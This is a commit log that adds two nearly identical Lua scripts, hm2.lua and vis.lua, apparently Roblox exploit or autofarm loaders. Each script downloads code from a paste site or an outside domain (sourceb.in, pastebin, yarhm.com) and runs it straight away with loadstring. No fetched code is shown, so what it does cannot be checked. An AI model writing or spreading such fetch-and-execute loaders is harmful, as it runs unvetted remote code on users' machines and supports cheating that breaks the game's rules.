f8f864941f6643ccd162fa943eb7c4d9343e380e
Stillonthebus07 <jfloresnflores@gmail.com>
2026-07-06 15:01:53 -0400

    Add files via upload

---
+++ hm2.lua
@@ -0,0 +1,9 @@
+local function script()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/Wx6CJWzc1X/0'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://yarhm.com/'))()
+end
+
+task.spawn(script)
+task.spawn(farm)
---
+++ vis.lua
@@ -0,0 +1,9 @@
+local function script()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/Wx6CJWzc1X/0'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+end
+
+task.spawn(script)
+task.spawn(farm)
